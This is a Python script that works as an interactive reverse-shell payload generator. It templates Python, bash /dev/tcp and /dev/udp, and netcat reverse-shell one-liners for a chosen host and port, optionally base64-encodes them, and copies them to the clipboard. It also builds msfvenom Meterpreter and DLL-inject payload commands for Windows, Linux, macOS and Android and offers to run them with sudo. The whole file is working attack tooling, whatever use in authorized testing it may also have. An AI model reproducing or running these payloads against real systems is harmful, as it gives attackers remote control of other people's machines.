#!/usr/bin/env python3
import pyperclip as clip
import os
import base64
import codecs

def encodingMenu(selectLib, selectShell, name):
    os.system("clear")
    print('''
    ______ENCODING_______
    \n[1]. Base64 \n[2]. No Encoding \n
          ''')
    encodingSettings(selectLib, selectShell, name)


def encodingSettings(selectLib, selectShell, name):
    global shell
    global verbose
    global shellType
    encodeSelect = int(input("Select Encoding: "))
    while encodeSelect >= 4:
        encodingMenu(selectLib, selectShell, name)
    if encodeSelect == 1:
        encode = "base64"
        shell = codecs.encode(shell) 
        shell = base64.b64encode(shell)
        shell = shell.decode("utf-8")
        clip.copy(shell)
        if verbose == 1:
            print("\n_______INFO_____________")
            print("\n" + name)
            print("\nHOST= " + host)
            print("\nPORT= " + port)
            print("\nShell= " + shellType)
            print("\nENCODING= " + encode)
            #os.system("cat" + name + "> teste2" )
    if encodeSelect == 2:
        encode = "None"
        clip.copy(shell)
        if verbose == 1:
            print("\n_______INFO_____________")
            print("\n" + name)
            print("\nHOST= " + host)
            print("\nPORT= " + port)
            print("\nShell= " + shellType)
            print("\nENCODING= " + encode)
    print("Copied to Clipboard!")
    exit()


def shellsType(selectLib):
    global shellType
    os.system("clear")
    shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell \n[4]. Command Prompt (CMD) \n[9]. Back to Shell Select\n \nSelect ShellType: '''))
    while shellType >= 5 and shellType != 9 or shellType < 0:
        os.system("clear")
        shellType = int(input(''' 
    _______Shell Type________
    \n[1]. SH \n[2]. BASH \n[3]. powershell \n[4]. Command Prompt (CMD) \n[9]. Back to Shell Select\n \nSelect ShellType: '''))
    if shellType == 1:
        shellType = "sh" 
    elif shellType == 2:
        shellType = "bash"
    elif shellType == 3:
        shellType = "powershell"
    elif shellType == 4:
        shellType = "cmd"
    elif shellType == 9:
        os.system("clear")
        subMenu(selectLib)


def hostport(selectLib):
    global host
    global port
    if selectLib <= 3 and selectLib != 4:
        host = input("RHOST= ")
        while len(host) > 15 or "256" in host:
            print("IP Value too long")
            host = input("RHOST= ")
        port = input("PORT= ")
        while len(port) > 5:
            port("PORT Value too long")
            port = input("PORT= ")
    if selectLib == 4:
        host = input("LHOST= ")
        port = input("PORT= ")


def mainMenu():
    global verbose
    if verbose != 1:
        print('''
    ________MENU_________
    \n[1]. Python \n[2]. BASH \n[3]. NetCat \n[4]. MSFVenom \n\n[8]. Verbose Mode [ ]\n[9]. Exit
          ''')

    if verbose == 1:
        print('''
    ________MENU_________
    \n[1]. Python \n[2]. BASH \n[3]. NetCat \n[4]. MSFVenom \n\n[8]. Verbose Mode [X]\n[9]. Exit
          ''')


def subMenu(selectLib):
    if selectLib == 1:
        print('''
    _______PYTHON________
    \n[1]. Python 2.7 \n[2]. Python 2.7 W/ Exports \n[3]. Python 3\n[4]. Python 3 W/ Exports \n[9]. Back to Main Menu
          ''')
        pysubprocess(selectLib)

    if selectLib == 2:
        print('''
    ________BASH_________
    \n[1]. BASH -i \n[2]. BASH 196 \n[3]. BASH -i 5 \n[4]. BASH -i UDP \n[9]. Back to Main Menu
          ''')
        bashsubprocess(selectLib)

    if selectLib == 3:
        print(''' 
    _______NETCAT________
    \n[1]. nc -e \n[2]. nc -c \n[9]. Back To main Menu
          ''')
        ncsubprocess(selectLib)

    if selectLib == 4:
        print('''
    ______MSFVENOM_______
    \n[1]. Meterpreter Staged x64 Rev. TCP \n[2]. Meterpreter Unstaged x64 Rev. TCP \n[3]. Stage Reverse TCP \n[4]. Windows DLLInject \n[5]. Windows Patchup DLLInject\n[9]. Exit
          ''')
        venomsubprocess(selectLib)


def platformSystem(selectShell, selectLib):
    global platform
    global ext
    global arch
    if selectShell >= 1 and selectShell < 4 and arch == 0:
        platform = int(input("Select Platform: "))
        while platform > 4 and platform != 9:
            os.system("clear")
            platformMenu()
            platform = int(input("Select Platform: "))
        if platform == 1:
            platform = "windows/x64"
            ext = "exe"
        elif platform == 2:
            platform = "linux/x64"
            ext = "elf"
        elif platform == 3:
            platform = "osx/x64"
            ext = "macho"
        elif platform == 4:
            platform = "android"
            ext = "apk"
        elif platform == 9:
            os.system("clear")
            subMenu(selectLib)
            venomsubprocess(selectLib)
    if selectShell >= 1 and selectShell < 4 and arch == 1:
        platform = int(input("Select Platform: "))
        while platform > 4 and platform != 9:
            os.system("clear")
            platformMenu()
            platform = int(input("Select Platform: "))
        if platform == 1:
            platform = "windows/x64"
            ext = "exe"
        elif platform == 2:
            platform = "windows"
            ext = "exe"
        elif platform == 3:
            platform = "linux/x64"
            ext = "elf"
        elif platform == 4:
            platform = "linux/x86"
            ext = "elf"
        elif platform == 5:
            platform = "osx/x64"
            ext = "macho"
        elif platform == 6:
            platform = "android"
            ext = "apk"
        elif platform == 9:
            os.system("clear")
            subMenu(selectLib)
            venomsubprocess(selectLib)


def platformMenu(selectShell):
    global arch
    if selectShell <= 3 and arch == 0:
        print('''
    ______PLATFORM_______
    \n[1]. Windows x64 \n[2]. Linux \n[3]. MacOS \n[4]. Android \n[9]. Exit
          ''')
    
    if selectShell <= 3 and arch == 1:
        print('''
    ______PLATFORM_______
    \n[1]. Windows x64 \n[2]. Windows x86 \n[3]. Linux x64 \n[4]. Linux x86  \n[5]. MacOS \n[6]. Android \n[9]. Exit
          ''')

def venomsubprocess(selectLib):
    global platform
    global ext
    global host
    global port
    global arch
    arch = 0
    selectShell = int(input("Select Shell: "))
    if selectShell == 1:
        arch = 1
        hostport(selectLib)
        os.system("clear")
        platformMenu(selectShell)
        platformSystem(selectShell, selectLib)
        name = input("Insert Name for exploit: ")
        shell = "msfvenom -p {0}/meterpreter/reverse_tcp LHOST={1} LPORT={2} -f {4} -o {3}.{4}".format(platform, host, port, name, ext)
        clip.copy(shell)
        print("Copied to clipboard")
        run = int(input("Do you Want to Run it? (0 = N  1 = Y) : ")) 
        while run >= 2 or run < 0:
            run = int(input("Do you Want to Run it? (N or Y) : "))
        if run == 0:
            print("The command isn't going to execute\n its still in the clipboard!")
            exit()
        elif run == 1:
            root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : "))
            while root >= 2 or root < 0:
                root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : ")) 
            if root == 0:
                if verbose == 0:
                    print("\n Running... Please Wait")
                    os.system(shell + " >/dev/null 2>&1")                  
                    print("\nCommand has been executed **Without** Root priveleges!")
                    exit()
                if verbose == 1:
                    print("\n Running... Please Wait")
                    os.system(shell)                  
                    print("\nCommand has been executed **Without** Root priveleges!")
                    exit()
            elif root == 1:
                if verbose == 0:
                    print("\n Running... Please Wait")
                    os.system("sudo " + shell + " >/dev/null 2>&1")
                    print("\nCommand has been executed **With** Root priveleges!")
                    exit()
                if verbose == 1:
                    print("\n Running... Please Wait")
                    os.system("sudo " + shell)
                    print("\nCommand has been executed **With** Root priveleges!")
                    exit()
   
            
    if selectShell == 2:
        arch = 1
        hostport(selectLib)
        os.system("clear")
        platformMenu(selectShell)
        platformSystem(selectShell, selectLib)
        name = input("Insert Name for exploit: ")
        shell = "msfvenom -p {0}/meterpreter_reverse_tcp LHOST={1} LPORT={2} -f {4} -o {3}.{4}".format(platform, host, port, name, ext)
        print(shell)
        clip.copy(shell)
        print("Copied to clipboard")
        run = int(input("Do you Want to Run it? (0 = N  1 = Y) : ")) 
        while run >= 2 or run < 0:
            run = int(input("Do you Want to Run it? (N or Y) : "))
        if run == 0:
            print("The command isn't going to execute\n its still in the clipboard!")
            exit()
        elif run == 1:
            root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : "))
            while root >= 2 or root < 0:
                root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : "))
            if root == 0:
                if verbose == 0:
                    print("\n Running... Please Wait")
                    os.system(shell + " >/dev/null 2>&1")                  
                    print("\nCommand has been executed **Without** Root priveleges!")
                    exit()
                if verbose == 1:
                    print("\n Running... Please Wait")
                    os.system(shell)                  
                    print("\nCommand has been executed **Without** Root priveleges!")
                    exit()
            elif root == 1:
                if verbose == 0:
                    print("\n Running... Please Wait")
                    os.system("sudo " + shell + " >/dev/null 2>&1")
                    print("\nCommand has been executed **With** Root priveleges!")
                    exit()
                if verbose == 1:
                    print("\n Running... Please Wait")
                    os.system("sudo " + shell)
                    print("\nCommand has been executed **With** Root priveleges!")
                    exit()

    if selectShell == 3:
        arch = 1
        hostport(selectLib)
        os.system("clear")
        platformMenu(selectShell) 
        platformSystem(selectShell, selectLib)
        name = input("Insert Name for exploit: ")
        shell = "msfvenom -p {0}/shell/reverse_tcp LHOST={1} LPORT={2} -f {4} -o {3}.{4}".format(platform, host, port, name, ext)
        print(shell)
        clip.copy(shell)
        print("Copied to clipboard")
        run = int(input("Do you Want to Run it? (0 = N  1 = Y) : ")) 
        while run >= 2 or run < 0:
            run = int(input("Do you Want to Run it? (N or Y) : "))
        if run == 0:
            print("The command isn't going to execute\n its still in the clipboard!")
            exit()
        elif run == 1:
            root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : "))
            while root >= 2 or root < 0:
                root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : ")) 
            if root == 0:
                if verbose == 0:
                    print("\n Running... Please Wait")
                    os.system(shell + " >/dev/null 2>&1")                  
                    print("\nCommand has been executed **Without** Root priveleges!")
                    exit()
                if verbose == 1:
                    print("\n Running... Please Wait")
                    os.system(shell)                  
                    print("\nCommand has been executed **Without** Root priveleges!")
                    exit()
            elif root == 1:
                if verbose == 0:
                    print("\n Running... Please Wait")
                    os.system("sudo " + shell + " >/dev/null 2>&1")                   
                    print("\nCommand has been executed **With** Root priveleges!")
                    exit()
                if verbose == 1:
                    print("\n Running... Please Wait")
                    os.system("sudo " + shell)
                    print("\nCommand has been executed **With** Root priveleges!")
                    exit()

    if selectShell == 4:
        hostport(selectLib)
        os.system("clear")
        name = input("\nInsert Name for exploit: ")
        shell = "msfvenom -p windows/dllinject/reverse_tcp LHOST={0} LPORT={1} -f exe -o {2}.exe".format(host, port, name)
        print(shell)
        clip.copy(shell)
        print("Copied to clipboard")
        run = int(input("Do you Want to Run it? (0 = N  1 = Y) : ")) 
        while run >= 2 or run < 0:
            run = int(input("Do you Want to Run it? (N or Y) : "))
        if run == 0:
            print("The command isn't going to execute\n its still in the clipboard!")
            exit()
        elif run == 1:
            root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : "))
            while root >= 2 or root < 0:
                root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : ")) 
            if root == 0:
                if verbose == 0:
                    print("\n Running... Please Wait")
                    os.system(shell + " >/dev/null 2>&1")                  
                    print("\nCommand has been executed **Without** Root priveleges!")
                    exit()
                if verbose == 1:
                    print("\n Running... Please Wait")
                    os.system(shell)                  
                    print("\nCommand has been executed **Without** Root priveleges!")
                    exit()
            elif root == 1:
                if verbose == 0:
                    print("\n Running... Please Wait")
                    os.system("sudo " + shell + " >/dev/null 2>&1")
                    print("\nCommand has been executed **With** Root priveleges!")
                    exit()
                if verbose == 1:
                    print("\n Running... Please Wait")
                    os.system("sudo " + shell)
                    print("\nCommand has been executed **With** Root priveleges!")
                    exit()

    if selectShell == 5:
        hostport(selectLib)
        name = input("\nInsert Name for exploit: ")
        shell = "msfvenom -p windows/patchupdllinject/reverse_tcp LHOST={0} LPORT={1} -f exe -o {2}.exe".format(host, port, name)
        print(shell)
        clip.copy(shell)
        print("Copied to clipboard")
        run = int(input("Do you Want to Run it? (0 = N  1 = Y) : ")) 
        while run >= 2 or run < 0:
            run = int(input("Do you Want to Run it? (N or Y) : "))
        if run == 0:
            print("The command isn't going to execute\n its still in the clipboard!")
            exit()
        elif run == 1:
            root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : "))
            while root >= 2 or root < 0:
                root = int(input("Execute with Root priveleges? (0 = N  1 = Y) : ")) 
            if root == 0:
                if verbose == 0:
                    print("\n Running... Please Wait")
                    os.system(shell + " >/dev/null 2>&1")                  
                    print("\nCommand has been executed **Without** Root priveleges!")
                    exit()
                if verbose == 1:
                    print("\n Running... Please Wait")
                    os.system(shell)                  
                    print("\nCommand has been executed **Without** Root priveleges!")
                    exit()
            elif root == 1:
                if verbose == 0:
                    print("\n Running... Please Wait")
                    os.system("sudo " + shell + " >/dev/null 2>&1")
                    print("\nCommand has been executed **With** Root priveleges!")
                    exit()
                if verbose == 1:
                    print("\n Running... Please Wait")
                    os.system("sudo " + shell)
                    print("\nCommand has been executed **With** Root priveleges!")
                    exit()


    if selectShell == 9:
        os.system("clear")
        main()
    else:
        os.system("clear")
        subMenu(selectLib)
        venomsubprocess(selectLib)



def pysubprocess(selectLib):
    global host
    global port
    global shellType
    global shell
    selectShell = int(input("Select Shell: "))
    if selectShell == 1:
        name = "Python 2.7 Rev Shell"
        hostport(selectLib)
        shellsType(selectLib)
        shell ="""python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("{2}")'""".format(host, port, shellType)
        encodingMenu(selectLib, selectShell, name)

    if selectShell == 2:
        name = "Python 2.7 With Exports"
        hostport(selectLib)
        shellsType(selectLib)
        shell ="""export RHOST="{0}";export RPORT={1};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{2}")'""".format(host, port, shellType)
        encodingMenu(selectLib, selectShell, name)
        
    if selectShell == 3:
        name = "Python 3 Rev Shell"
        hostport(selectLib)
        shellsType(selectLib)
        shell ="""python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("{2}")'""".format(host, port, shellType)
        encodingMenu(selectLib, selectShell, name)

    if selectShell == 4:
        name = "Python 3 With Exports"
        hostport(selectLib)
        shellsType(selectLib)
        shell ="""export RHOST="{0}";export RPORT={1};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{2}")'""".format(host, port, shellType)
        encodingMenu(selectLib, selectShell, name)
    elif selectShell == 9:
        main()
    else:
        os.system("clear")
        subMenu(selectLib)
        pysubprocess(selectLib)


def bashsubprocess(selectLib):
    global host
    global port
    global shellType
    global shell
    selectShell = int(input("Select Shell: "))
    if selectShell == 1:
        name = "BASH -i Rev Shell"
        hostport(selectLib)
        shellsType(selectLib)
        shell = "{2} -i >& /dev/tcp/{0}/{1} 0>&1".format(host, port, shellType)
        encodingMenu(selectLib, selectShell, name)
    if selectShell == 2:
        name = "BASH 196 Rev Shell"
        hostport(selectLib)
        shellsType(selectLib)
        shell = "0<&196;exec 196<>/dev/tcp/{0}/{1}; {2} <&196 >&196 2>&196".format(host, port, shellType)
        encodingMenu(selectLib, selectShell, name)
    if selectShell == 3:
        name = "BASH -i 5 Rev Shell"
        hostport(selectLib)
        shellsType(selectLib)
        shell = "{2} -i 5<> /dev/tcp/{0}/{1} 0<&5 1>&5 2>&5".format(host, port, shellType)
        encodingMenu(selectLib, selectShell, name)
    if selectShell == 4:
        name = "BASH -i UDP Rev Shell"
        hostport(selectLib)
        shellsType(selectLib)
        shell = "{2} -i >& /dev/udp/{0}/{1} 0>&1".format(host, port,shellType)
        encodingMenu(selectLib, selectShell, name)
    elif selectShell == 9:
        main()
    else:
        os.system("clear")
        subMenu(selectLib)
        bashsubprocess(selectLib)


def ncsubprocess(selectLib):
    global shell
    global host
    global port
    global shellType
    selectShell = int(input("Select Shell: ")) 
    if selectShell == 1:
        name = "NetCat -e Rev Shell "
        hostport(selectLib)
        shellsType(selectLib)
        shell = "nc {0} {1} -e {2}".format(host, port, shellType)
        encodingMenu(selectLib, selectShell, name)

    if selectShell == 2:
        name = "NetCat -c Rev Shell"
        hostport(selectLib)
        shellsType(selectLib)
        shell = "nc -c {2} {0} {1} ".format(host, port, shellType)
        encodingMenu(selectLib, selectShell, name)
    if selectShell == 9:
        main()
    else:
        os.system("clear")
        subMenu(selectLib)
verbose = 0
def main():
    global verbose
    os.system("clear")
    mainMenu()
    selectLib = int(input("Select Library: "))

    if selectLib == 1:
        os.system("clear")
        subMenu(selectLib)
    elif selectLib == 2:
        os.system("clear")
        subMenu(selectLib)
    elif selectLib == 3:
        os.system("clear")
        subMenu(selectLib)
    elif selectLib == 4:
        os.system("clear")
        subMenu(selectLib)

    elif selectLib == 8:
        if verbose == 0:
            verbose = 1
        else:
            verbose = 0
        
        main()

    elif selectLib == 9:
        exit()
    else:
        main()

if __name__ == "__main__":
    main()
